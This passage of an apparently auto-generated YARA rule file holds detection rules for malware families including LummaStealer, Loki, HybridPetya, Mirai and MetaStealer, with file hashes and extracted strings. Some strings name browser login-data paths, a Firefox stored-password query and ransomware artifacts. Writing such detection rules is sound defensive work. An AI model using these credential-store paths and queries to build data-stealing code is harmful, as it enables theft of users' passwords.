      $x4 = "runtime.newosprocinternal/runtime/thread exhaustionlocked m0 woke upentersyscallblock spinningthreads=unknown caller pcstack: fr" ascii /* score: '50.00'*/
      $x5 = "/memory/classes/heap/objects:bytestoo many pages allocated in chunk?mspan.ensureSwept: m is not lockedVirtualQuery for stack bas" ascii /* score: '49.00'*/
      $x6 = "23841857910156250123456789ABCDEFGODEBUG: value \"allowmultiplevcsDuplicateTokenExCreateNamedPipeWGetCurrentThreadGetModuleHandle" ascii /* score: '46.00'*/
      $x7 = ", locked to thread, synctest bubble runtime.semacreateruntime.semawakeupvalue out of range298023223876953125reflect.Value.Elemre" ascii /* score: '45.00'*/
      $x8 = "lock: lock countbad system huge page sizearena already initialized to unused region of span bytes failed with errno=runtime: Vir" ascii /* score: '44.00'*/
      $x9 = "/cpu/classes/total:cpu-seconds/gc/cycles/automatic:gc-cycles/sched/pauses/total/gc:seconds/sync/mutex/wait/total:seconds/godebug" ascii /* score: '42.50'*/
      $x10 = "unlock: lock countprogToPointerMask: overflow/gc/cycles/forced:gc-cycles/memory/classes/other:bytes/memory/classes/total:bytesfa" ascii /* score: '41.00'*/
      $x11 = "/memory/classes/metadata/mspan/free:bytesgcSweep being done but phase is not GCoffobjects added out of order or overlappingmheap" ascii /* score: '40.00'*/
      $x12 = "sched={pc:, gp->status= pluginpath= : unknown pc  called from runtime: pid=3814697265625invalid base crypto/subtlegocacheverifyi" ascii /* score: '38.00'*/
      $x13 = "runtime: casgstatus: oldval=gcstopm: negative nmspinningfindrunnable: netpoll with psave on system g not allowednewproc1: newg m" ascii /* score: '38.00'*/
      $x14 = "updateMaxProcsGoroutine: phase errorruntime: bad notifyList size - sync=accessed data from freed user arena runtime: wrong gorou" ascii /* score: '37.00'*/
      $x15 = "malformed GOMEMLIMIT; see `go doc runtime/debug.SetMemoryLimit`runtime.AddCleanup: ptr is equal to arg, cleanup will never runco" ascii /* score: '37.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and pe.imphash() == "1aae8bf580c846f39c71c05898e57e88" and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _HijackLoader_signature__d8b31f8c03e0c76ff245ed05a15ffe6c_imphash__LummaStealer_signature__1aae8bf580c846f39c71c05898e57e88__13 {
   meta:
      description = "_subset_batch - from files HijackLoader(signature)_d8b31f8c03e0c76ff245ed05a15ffe6c(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_179bdf50.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_3c2ef69a.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_7935d548.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_9e4a0b96.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_a7270dd3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aa59b9a8c2a1121e10d0bf939fc255b2ddd213fce8b1bba3c8ef84632be02aa3"
      hash2 = "8ad7cbc9e16fe872a2296b32cdcc52744969b90fb400abcec7ab24a853c2f36b"
      hash3 = "179bdf50eba7b0927eae4104945cd4e5fe66ef77d89f9a693cadb13fa78e6ab5"
      hash4 = "3c2ef69aea6cb66957fb694c4aec987b9df428698be5336b3ac4b4acdbe122b6"
      hash5 = "7935d54819db8a8e3a92ad06a95496a1884d368d27e3af2bc4e7ba3e2e49c952"
      hash6 = "9e4a0b96a349285d56db12ff601ef94e16da03c5a71460995d218e4a84b17c63"
      hash7 = "a7270dd368ccee242cdfcc13b7b4993d3eee78ab3981e04b96ba2d2e33f8eb3b"
   strings:
      $x1 = "mheap.freeSpanLocked - invalid free of user arena chunkcasfrom_Gscanstatus:top gp->status is not in scan state is currently not " ascii /* score: '39.00'*/
      $s2 = "SiblingLocationNameOrderingByteSizeBitOffsetBitSizeStmtListLowpcHighpcLanguageDiscrDiscrValueVisibilityImportStringLengthCommonR" ascii /* score: '29.00'*/
      $s3 = " memory segmentruntime: netpoll: PostQueuedCompletionStatus failed (errno= runtime: malformed profBuf buffer - tag and data out " ascii /* score: '26.00'*/
      $s4 = "lock: sleeping while lock is availableP has cached GC work at end of mark terminationfailed to acquire lock to start a GC transi" ascii /* score: '22.00'*/
      $s5 = "sync/atomic.(*Pointer[go.shape.struct { internal/bisect.recent [128][4]uint64; internal/bisect.mu sync.Mutex; internal/bisect.m " ascii /* score: '22.00'*/
      $s6 = "runtime.totalMutexWaitTimeNanos" fullword ascii /* score: '21.00'*/
      $s7 = "os.Executable" fullword ascii /* score: '20.00'*/
      $s8 = "23841857910156250123456789ABCDEFGODEBUG: value \"allowmultiplevcsDuplicateTokenExCreateNamedPipeWGetCurrentThreadGetModuleHandle" ascii /* score: '20.00'*/
      $s9 = "dressmspan.sweep: bad span stateinvalid profile bucket typeruntime: corrupted polldescruntime: netpollinit failedruntime: asyncP" ascii /* score: '18.00'*/
      $s10 = "resssocket type not supportedinvalid cross-device linkGetFinalPathNameByHandleWGetQueuedCompletionStatusUpdateProcThreadAttribut" ascii /* score: '18.00'*/
      $s11 = "work.nprocleft over markroot jobsgcDrain phase incorrectMB during sweep; swept bad profile stack countruntime: netpoll failedpan" ascii /* score: '18.00'*/
      $s12 = "runtime.metricReader.compute-fm" fullword ascii /* score: '17.00'*/
      $s13 = "runtime.metricReader.compute" fullword ascii /* score: '17.00'*/
      $s14 = "runtime.compute0" fullword ascii /* score: '17.00'*/
      $s15 = "os.executable" fullword ascii /* score: '16.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Loki_signature__42df8cddab9f727c84147e27ef7d3be8_imphash__Loki_signature__63a7884deadb0f34accabcb21cf8585a_imphash__14 {
   meta:
      description = "_subset_batch - from files Loki(signature)_42df8cddab9f727c84147e27ef7d3be8(imphash).exe, Loki(signature)_63a7884deadb0f34accabcb21cf8585a(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "15e8d5653fd3b72016dc0ceb50ce62dfea6e49871a7cd27eb2af6ab044706f30"
      hash2 = "163658a6ee255f717f46ae8d030a75b0b0e5f53907b8f8b91d4f07fd32b94972"
   strings:
      $s1 = "clWebDarkMagenta" fullword ascii /* score: '14.00'*/
      $s2 = "Stream write error\"Unable to find a Table of Contents" fullword wide /* score: '14.00'*/
      $s3 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\FontSubstitutes" fullword ascii /* score: '12.00'*/
      $s4 = "<|<t<p<h<d<\\<X<P<L<D<@<8<4<,<(< <" fullword ascii /* reversed goodware string '< <(<,<4<8<@<D<L<P<X<\\<d<h<p<t<|<' */ /* score: '11.00'*/
      $s5 = "\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts\\" fullword ascii /* score: '11.00'*/
      $s6 = "9t9p9l9h9d9`9\\9X9T9P9L9H9D9@9<9894909,9(9$9 9" fullword ascii /* reversed goodware string '9 9$9(9,9094989<9@9D9H9L9P9T9X9\\9`9d9h9l9p9t9' */ /* score: '11.00'*/
      $s7 = "evalcomp" fullword ascii /* score: '11.00'*/
      $s8 = ">k>d>E>" fullword ascii /* reversed goodware string '>E>d>k>' */ /* score: '11.00'*/
      $s9 = "=|=x=p=l=d=`=X=T=L=H=@=<=4=0=(=$=" fullword ascii /* reversed goodware string '=$=(=0=4=<=@=H=L=T=X=`=d=l=p=x=|=' */ /* score: '11.00'*/
      $s10 = ";J;C;>;" fullword ascii /* reversed goodware string ';>;C;J;' */ /* score: '11.00'*/
      $s11 = "<m<:<-< <" fullword ascii /* reversed goodware string '< <-<:<m<' */ /* score: '11.00'*/
      $s12 = "9<9894909,9(9$9 9" fullword ascii /* reversed goodware string '9 9$9(9,9094989<9' */ /* score: '11.00'*/
      $s13 = "=|=t=l=d=\\=T=L=D=<=4=,=$=" fullword ascii /* reversed goodware string '=$=,=4=<=D=L=T=\\=d=l=t=|=' */ /* score: '11.00'*/
      $s14 = "=g=P=4=" fullword ascii /* reversed goodware string '=4=P=g=' */ /* score: '11.00'*/
      $s15 = "0?(? ?" fullword ascii /* reversed goodware string '? ?(?0' */ /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( 8 of them )
      ) or ( all of them )
}

rule _HybridPetya_signature__26fd3bd2590726fe37fe6dc4a8a6e2b8_imphash__HybridPetya_signature__455109ecf9b9d7e0046113635782e7d1_im_15 {
   meta:
      description = "_subset_batch - from files HybridPetya(signature)_26fd3bd2590726fe37fe6dc4a8a6e2b8(imphash).dll, HybridPetya(signature)_455109ecf9b9d7e0046113635782e7d1(imphash)_b949e951.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c25e5f72850f5571e312043ad9bc3542e3dfa258d3e913b23900d3e46b998437"
      hash2 = "b949e95160734c2240ed6f330a5586e2a890264ae207df2b2f7209e361b1d239"
   strings:
      $s1 = "core.dll" fullword ascii /* score: '23.00'*/
      $s2 = "YOUR_FILES_ARE_ENCRYPTED.TXT" fullword ascii /* score: '16.00'*/
      $s3 = "FEDCBA" ascii /* reversed goodware string 'ABCDEF' */ /* score: '13.50'*/
      $s4 = "NMLKJI" fullword ascii /* reversed goodware string 'IJKLMN' */ /* score: '13.50'*/
      $s5 = "VUTSRQ" fullword ascii /* reversed goodware string 'QRSTUV' */ /* score: '13.50'*/
      $s6 = "_ReflectiveLoader@4" fullword ascii /* score: '13.00'*/
      $s7 = "1FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFA51868783BF2F966B7FCC0148F709A5D03BB5C9B8899C47AEBB6FB71E91386" ascii /* score: '11.00'*/
      $s8 = "_^]\\[ZY" fullword ascii /* reversed goodware string 'YZ[\\]^_' */ /* score: '11.00'*/
      $s9 = "0303001D34B856296C16C0D40D3CD7750A93D1D2955FA80AA5F40FC8DB7B2ABDBDE53950F4C0D293CDD711A35B67FB1499AE60038614F1394ABFA3B4C850D927" ascii /* score: '11.00'*/
      $s10 = "0987654321" ascii /* reversed goodware string '1234567890' */ /* score: '11.00'*/
      $s11 = "011839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd1" ascii /* score: '11.00'*/
      $s12 = "1FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF" ascii /* score: '11.00'*/
      $s13 = "C6858E06B70404E9CD9E3ECB662395B4429C648139053FB521F828AF606B4D3DBAA14B5E77EFE75928FE1DC127A2FFA8DE3348B3C1856A429BF97E7E31C2E5BD" ascii /* score: '11.00'*/
      $s14 = "$Recycle.Bin" fullword ascii /* score: '10.00'*/
      $s15 = "d:\\openssl-0.9.8zb\\crypto\\ec\\ec2_smpt.c" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Loda_signature__0e136cae6f625c80ecae333d9e2a37fa_imphash__Loki_signature__1895460fffad9475fda0c84755ecfee1_imphash__Loki_si_16 {
   meta:
      description = "_subset_batch - from files Loda(signature)_0e136cae6f625c80ecae333d9e2a37fa(imphash).exe, Loki(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, Loki(signature)_98f67c550a7da65513e63ffd998f6b2e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "832cc19d110505d64ec506f0b6ba8c8658b51e074e9097c3b1de8cb06152643a"
      hash2 = "b39df39579ecb80331677bf1a9c36a857fc48f8658839987af4493ff4e73efa9"
      hash3 = "60ca1d32e2a19f4df9278382f81b3b460181dab8060b9ee2922ce9c497fb181d"
   strings:
      $s1 = "/AutoIt3ExecuteScript" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s2 = "/AutoIt3ExecuteLine" fullword wide /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s3 = "PROCESSGETSTATS" fullword wide /* score: '22.50'*/
      $s4 = "WINGETPROCESS" fullword wide /* score: '22.50'*/
      $s5 = "SCRIPTNAME" fullword wide /* base64 encoded string 'H$H=3@0' */ /* score: '22.50'*/
      $s6 = "SHELLEXECUTE" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s7 = "SHELLEXECUTEWAIT" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s8 = "*Unable to get a list of running processes." fullword wide /* score: '20.00'*/
      $s9 = "HTTPSETUSERAGENT" fullword wide /* score: '17.50'*/
      $s10 = "PROCESSCLOSE" fullword wide /* score: '17.50'*/
      $s11 = "PROCESSEXISTS" fullword wide /* score: '17.50'*/
      $s12 = "PROCESSLIST" fullword wide /* score: '17.50'*/
      $s13 = "PROCESSSETPRIORITY" fullword wide /* score: '17.50'*/
      $s14 = "PROCESSWAIT" fullword wide /* score: '17.50'*/
      $s15 = "PROCESSWAITCLOSE" fullword wide /* score: '17.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _HijackLoader_signature__d8b31f8c03e0c76ff245ed05a15ffe6c_imphash__Kaiji_signature__Kaiji_signature__78e6c917_Kaiji_signatur_17 {
   meta:
      description = "_subset_batch - from files HijackLoader(signature)_d8b31f8c03e0c76ff245ed05a15ffe6c(imphash).exe, Kaiji(signature).elf, Kaiji(signature)_78e6c917.elf, Kaiji(signature)_7cab2814.elf, Kaiji(signature)_8895157c.elf, Kaiji(signature)_a82036bb.elf, Kaiji(signature)_af3c1821.elf, Kaiji(signature)_bd7a37a8.elf, Kaiji(signature)_c6c0da6a.elf, Kaiji(signature)_ded5e440.elf, Kaiji(signature)_eec9b44f.elf, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_179bdf50.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_3c2ef69a.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_7935d548.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_9e4a0b96.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_a7270dd3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aa59b9a8c2a1121e10d0bf939fc255b2ddd213fce8b1bba3c8ef84632be02aa3"
      hash2 = "aead4ac6bea6859316dce9aeda0d704e05293466dde897247c7c32cb32c6a4e1"
      hash3 = "78e6c917b26061148d6a1f589521c9a91cb3c35d7263b046bbbfb08e7ad43c34"
      hash4 = "7cab2814a06c64a3cacd86d90222f469c67a4c9ff927c8fc0b262f8a667b2992"
      hash5 = "8895157c86f0f62ccc96c12ca064bb7cc1d311cbe94467fbe9895f3aa74b5f43"
      hash6 = "a82036bbe31274fd6c010f76f210d3c81dfbc47eb36843a9ce5e5ea50a6cd29f"
      hash7 = "af3c182144f6ec184bbae0429ffe5d29767cd82cec0410faf6fa3068b4551afb"
      hash8 = "bd7a37a86a1fa6831f426d1570f702aaffe454b4609eda5f111b7bd0f4d6da81"
      hash9 = "c6c0da6a5a6c95627c240816ab46ccf88b5e661c59827c33e9af6ef4080855d8"
      hash10 = "ded5e44044fbffebe6a1beb9d66f8c9282cbf7cef065d8231244997f0829a84e"
      hash11 = "eec9b44f6de1f6157457edc8da37f9813a75b3176c61f89b7aa78dcdf7890892"
      hash12 = "8ad7cbc9e16fe872a2296b32cdcc52744969b90fb400abcec7ab24a853c2f36b"
      hash13 = "179bdf50eba7b0927eae4104945cd4e5fe66ef77d89f9a693cadb13fa78e6ab5"
      hash14 = "3c2ef69aea6cb66957fb694c4aec987b9df428698be5336b3ac4b4acdbe122b6"
      hash15 = "7935d54819db8a8e3a92ad06a95496a1884d368d27e3af2bc4e7ba3e2e49c952"
      hash16 = "9e4a0b96a349285d56db12ff601ef94e16da03c5a71460995d218e4a84b17c63"
      hash17 = "a7270dd368ccee242cdfcc13b7b4993d3eee78ab3981e04b96ba2d2e33f8eb3b"
   strings:
      $s1 = "*poll.fdMutex" fullword ascii /* score: '15.00'*/
      $s2 = "internal/poll.(*fdMutex).incref" fullword ascii /* score: '15.00'*/
      $s3 = "internal/poll.(*fdMutex).decref" fullword ascii /* score: '15.00'*/
      $s4 = "internal/poll.(*fdMutex).rwlock" fullword ascii /* score: '15.00'*/
      $s5 = "internal/poll.(*fdMutex).rwunlock" fullword ascii /* score: '15.00'*/
      $s6 = "internal/poll.(*fdMutex).increfAndClose" fullword ascii /* score: '15.00'*/
      $s7 = "strconv.computeBounds" fullword ascii /* score: '14.00'*/
      $s8 = "reflect.Value.Complex" fullword ascii /* score: '14.00'*/
      $s9 = "reflect.Value.Comparable" fullword ascii /* score: '14.00'*/
      $s10 = "runtime.netpollblockcommit" fullword ascii /* score: '13.00'*/
      $s11 = "errors.New" fullword ascii /* score: '13.00'*/
      $s12 = "strconv.mulByLog2Log10" fullword ascii /* score: '12.00'*/
      $s13 = "sync.(*Pool).Get" fullword ascii /* score: '12.00'*/
      $s14 = "fmt.getField" fullword ascii /* score: '12.00'*/
      $s15 = "strconv.mulByLog10Log2" fullword ascii /* score: '12.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 17000KB and ( 8 of them )
      ) or ( all of them )
}

rule _MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2ce03589_MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5_18 {
   meta:
      description = "_subset_batch - from files MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2ce03589.exe, MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_82453da0.exe, MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c9e43424.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2ce0358958dec9420addee948555ce5fd0810e9b6054c6a9d5b472e93501e582"
      hash2 = "82453da04a3618eede4ec065f24f8e3e4e0c120072e659a6edf23eb7a7933a84"
      hash3 = "c9e434249c8233d35e8bb5a03cdd049a100ed54ecb6d1080b25b3aabcc73f2e5"
   strings:
      $s1 = "Event Log Analysis Report - " fullword wide /* score: '20.00'*/
      $s2 = "EventLog_Analysis_{0}_{1:yyyyMMdd_HHmmss}.txt" fullword wide /* score: '19.00'*/
      $s3 = "Error getting statistics for event log '" fullword wide /* score: '17.00'*/
      $s4 = "Error getting available event logs: " fullword wide /* score: '17.00'*/
      $s5 = "Error getting entry count for event log '" fullword wide /* score: '17.00'*/
      $s6 = "Event Log Analyzer - v1.0" fullword wide /* score: '17.00'*/
      $s7 = "labelLogInfo" fullword wide /* score: '15.00'*/
      $s8 = "UpdateLogInfo" fullword ascii /* score: '15.00'*/
      $s9 = "EventLogAnalyzer.Forms.ErrorPatternForm.resources" fullword ascii /* score: '15.00'*/
      $s10 = "Error reading event log '" fullword wide /* score: '15.00'*/
      $s11 = "EventLog_Analysis_{0}_{1:yyyyMMdd_HHmmss}.csv" fullword wide /* score: '15.00'*/
      $s12 = "<GetEventLogStatistics>b__5_0" fullword ascii /* score: '14.00'*/
      $s13 = "GetAvailableEventLogs" fullword ascii /* score: '14.00'*/
      $s14 = "<GetAvailableEventLogs>b__6_0" fullword ascii /* score: '14.00'*/
      $s15 = "<GetEventLogStatistics>b__5_1" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _MetaStealer_signature__MetaStealer_signature__0d7e3c76_MetaStealer_signature__81e0f8ea_MetaStealer_signature__eca5f9cc_Meta_19 {
   meta:
      description = "_subset_batch - from files MetaStealer(signature).msi, MetaStealer(signature)_0d7e3c76.msi, MetaStealer(signature)_81e0f8ea.msi, MetaStealer(signature)_eca5f9cc.msi, MetaStealer(signature)_fa92e99a.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e4c677f7774fedd5ddbe939e6dba55c2ed199898337c2b281815679b37b3c6ff"
      hash2 = "0d7e3c762f5efaae862b98770a9788e79434965a3727254972e95cfd5cb8cc7b"
      hash3 = "81e0f8ea01563bac4e38392a51b2c5b4b233c11b3b28ef7a5c595c7e6f27640d"
      hash4 = "eca5f9cca61ff8052b2d7d9e75747a40b82b41d146d9461d21921ce50ebabbb9"
      hash5 = "fa92e99abf9f1cd05bb646c7c4379ee994d2ada574a397828aae254426b2bff9"
   strings:
      $x1 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii /* score: '31.00'*/
      $s2 = " - UNREGISTERED - Wrapped using MSI Wrapper from www.exemsi.com" fullword wide /* score: '26.00'*/
      $s3 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii /* score: '23.00'*/
      $s4 = "MsiCustomActions.dll" fullword ascii /* score: '23.00'*/
      $s5 = "C:\\ss2\\Projects\\MsiWrapper\\MsiCustomActions\\Release\\MsiCustomActions.pdb" fullword ascii /* score: '22.00'*/
      $s6 = "Error removing temp executable." fullword wide /* score: '22.00'*/
      $s7 = "EXPAND.EXE" fullword wide /* score: '22.00'*/
      $s8 = " format.InstallExecuteSequenceInstallUISequenceLaunchConditionExpression which must evaluate to TRUE in order for install to com" ascii /* score: '21.00'*/
      $s9 = "amFilesFolderbxjvilw7|[BZ.COMPANYNAME]TARGETDIR.SourceDirProductFeatureMain FeatureFindRelatedProductsLaunchConditionsValidatePr" ascii /* score: '21.00'*/
      $s10 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii /* score: '20.00'*/
      $s11 = "tionDllbz.ProductComponent{EDE10F6C-30F4-42CA-B5C7-ADB905E45BFC}BZ.INSTALLFOLDERregLogonUserbz.EarlyInstallMain_InstallMain@4bz." ascii /* score: '19.00'*/
      $s12 = "OS supports elevation" fullword wide /* score: '19.00'*/
      $s13 = "OS does not support elevation" fullword wide /* score: '19.00'*/
      $s14 = "oductIDMigrateFeatureStatesProcessComponentsUnpublishFeaturesRemoveRegistryValuesWriteRegistryValuesResolveSourceNOT REMOVE ~=\"" ascii /* score: '18.00'*/
      $s15 = "ack cabinet order.IconPrimary key. Name of the icon file.Binary stream. The binary icon data in PE (.DLL or .EXE) or icon (.ICO)" ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 18000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Mirai_signature__11bcd56a_Mirai_signature__19e62b77_20 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_11bcd56a.elf, Mirai(signature)_19e62b77.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "11bcd56afbf36da794f6dea6e502005528c17659a4a36cbaf32c526ce1ed5234"
      hash2 = "19e62b77d21ddb588294e3254c61aa1f3475475903b0165b3dad4ac0e2886ca5"
   strings:
      $s1 = "__pthread_mutexattr_getkind_np" fullword ascii /* score: '23.00'*/
      $s2 = "__pthread_mutexattr_gettype" fullword ascii /* score: '23.00'*/
      $s3 = "__pthread_mutexattr_getpshared" fullword ascii /* score: '23.00'*/
      $s4 = "__pthread_mutexattr_destroy" fullword ascii /* score: '18.00'*/
      $s5 = "__pthread_mutexattr_settype" fullword ascii /* score: '18.00'*/
      $s6 = "__pthread_mutex_destroy" fullword ascii /* score: '18.00'*/
      $s7 = "pthread_keys_mutex" fullword ascii /* score: '18.00'*/
      $s8 = "__pthread_mutexattr_setpshared" fullword ascii /* score: '18.00'*/
      $s9 = "__pthread_mutexattr_init" fullword ascii /* score: '18.00'*/
      $s10 = "__pthread_mutexattr_setkind_np" fullword ascii /* score: '18.00'*/
      $s11 = "mutex.c" fullword ascii /* score: '15.00'*/
      $s12 = "attacks_mutex" fullword ascii /* score: '15.00'*/
      $s13 = "pthread_onexit_process" fullword ascii /* score: '15.00'*/
      $s14 = "stop_attack_by_target" fullword ascii /* score: '14.00'*/
      $s15 = "__GI_pthread_attr_getscope" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _Loki_signature__0239fd611af3d0e9b0c46c5837c80e09_imphash__Loki_signature__0239fd611af3d0e9b0c46c5837c80e09_imphash__b344c38_21 {
   meta:
      description = "_subset_batch - from files Loki(signature)_0239fd611af3d0e9b0c46c5837c80e09(imphash).exe, Loki(signature)_0239fd611af3d0e9b0c46c5837c80e09(imphash)_b344c382.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "753bf4d227e6da0758621c5bc526660a59a3ae19ebc544ed7a2084b639e28733"
      hash2 = "b344c382027e7b1f33f91807955228294ac8dd2ce3941385d9c1358e8162392e"
   strings:
      $s1 = "SELECT encryptedUsername, encryptedPassword, formSubmitURL, hostname FROM moz_logins" fullword ascii /* score: '25.00'*/
      $s2 = "sCrypt32.dll" fullword wide /* score: '23.00'*/
      $s3 = "SmtpPassword" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s4 = "SMTP Password" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s5 = "FtpPassword" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s6 = "%s\\%s%i\\data\\settings\\ftpProfiles-j.jsd" fullword wide /* score: '21.50'*/
      $s7 = "aPLib v1.01  -  the smaller the better :)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00'*/
      $s8 = "%s\\%s\\User Data\\Default\\Login Data" fullword wide /* score: '20.50'*/
      $s9 = "%s%s\\Login Data" fullword wide /* score: '19.00'*/
      $s10 = "%s%s\\Default\\Login Data" fullword wide /* score: '19.00'*/
      $s11 = "%s\\32BitFtp.TMP" fullword wide /* score: '19.00'*/
      $s12 = "%s\\GoFTP\\settings\\Connections.txt" fullword wide /* score: '19.00'*/
      $s13 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook" fullword wide /* score: '18.00'*/
      $s14 = "%s\\Mozilla\\SeaMonkey\\Profiles\\%s" fullword wide /* score: '17.50'*/
      $s15 = "%s\\%s\\%s.exe" fullword wide /* score: '17.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and pe.imphash() == "0239fd611af3d0e9b0c46c5837c80e09" and ( 8 of them )
      ) or ( all of them )
}

rule _Loki_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__caa92a31_MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_i_22 {
   meta:
      description = "_subset_batch - from files Loki(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_caa92a31.exe, MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_849980f3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "caa92a31b30f0105856e28e65218fe2fec26f5903f10dbaeeab0e331cf267854"
      hash2 = "849980f3de2765b08724a192965702c7b9ffc9c2da402d8968f9f8f2213037f0"
   strings:
      $s1 = "\\SERVER=localhost; Database=used_cars; UID=root; Password=dumbdaddy;allow user variables=true" fullword ascii /* score: '20.00'*/
      $s2 = "Login Failed !" fullword wide /* score: '18.00'*/
      $s3 = "select * from users where u_pass=md5('" fullword wide /* score: '16.00'*/
      $s4 = "Login_Shown" fullword ascii /* score: '15.00'*/
      $s5 = "Login_Load" fullword ascii /* score: '15.00'*/
      $s6 = "Used_cars.Presentation.Login.resources" fullword ascii /* score: '15.00'*/
      $s7 = "Password change Failed" fullword wide /* score: '15.00'*/
      $s8 = "Login Information" fullword wide /* score: '15.00'*/
      $s9 = "Login Failed... " fullword wide /* score: '13.00'*/
      $s10 = "changePasswordToolStripMenuItem" fullword wide /* score: '12.00'*/
      $s11 = "MySqlCommand" fullword ascii /* score: '12.00'*/
      $s12 = "btn_login" fullword wide /* score: '12.00'*/
      $s13 = "Change_Password" fullword wide /* score: '12.00'*/
      $s14 = "changePasswordToolStripMenuItem_Click" fullword ascii /* score: '12.00'*/
      $s15 = "Change_Password_Load" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _GuLoader_signature__20b78073_GuLoader_signature__248cd0e0_23 {
   meta:
      description = "_subset_batch - from files GuLoader(signature)_20b78073.vbs, GuLoader(signature)_248cd0e0.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "20b780733c72830df9590f05583a5b413164b5487c001f9216e284aa46dfcc4c"
      hash2 = "248cd0e08f4368cddd982e9b7c25f0896ffe8ef9ea0dd0e94b2ed8681b95cd3a"
   strings:
      $s1 = "Tempoerskalmykisk = Tempoerskalmykisk - 7132332 " fullword ascii /* score: '19.00'*/
      $s2 = "Rem permanents stempelafgiftslove! apologiae; drummers" fullword ascii /* score: '16.00'*/
      $s3 = "Operationsplansvictor = Log(4426119)" fullword ascii /* score: '14.00'*/
